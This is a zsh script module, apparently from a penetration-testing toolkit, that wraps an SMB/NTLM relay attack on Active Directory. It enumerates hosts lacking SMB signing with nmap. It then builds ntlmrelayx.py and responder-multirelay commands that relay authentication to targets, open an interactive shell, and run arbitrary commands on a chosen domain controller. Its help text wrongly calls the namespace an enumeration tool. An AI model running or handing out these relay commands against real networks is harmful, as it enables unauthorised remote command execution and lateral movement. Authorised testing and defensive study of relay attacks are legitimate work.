#!/usr/bin/env zsh

############################################################# 
# nb-ad-smb-relay
#############################################################
nb-ad-smb-relay-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-smb-relay
------------
The nb-ad-smb-relay namespace contains commands for scanning and 
enumerating Active Directory DC, GC and LDAP servers.

Commands
--------
nb-ad-smb-relay-install              installs dependencies
nb-ad-smb-relay-enum                 identify hosts without smb signing
nb-ad-smb-relay-ntlmrelay            replay the SMB requests
nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
nb-ad-smb-relay-ntlmrelay-whoami     execute a whoami shell command on a target host using ntlmrelayx.py
nb-ad-smb-relay-multirelay-command   execute a shell command on a target host using multirelay.py

DOC
}

nb-ad-smb-relay-install() {
    __info "Running $0..."
    __pkgs impacket responder
}

nb-ad-smb-relay-enum() {
    __check-project
  	nb-vars-set-network

    print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
}

nb-ad-smb-relay-ntlmrelay() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(domadpath)/ntlmrelayx.txt"
}

nb-ad-smb-relay-ntlmrelay-shell() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(domadpath)/ntlmrelayx-shell.txt"
}

nb-ad-smb-relay-ntlmrelay-whoami() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee $(domadpath)/ntlmrelayx-whoami.txt"
}

nb-ad-smb-relay-multirelay-command() {
    __check-project
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost
	  __ask "Enter a shell command to execute"
	  local command && __askvar command COMMAND

	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(domadpath)/responder-multirelay.txt"
}
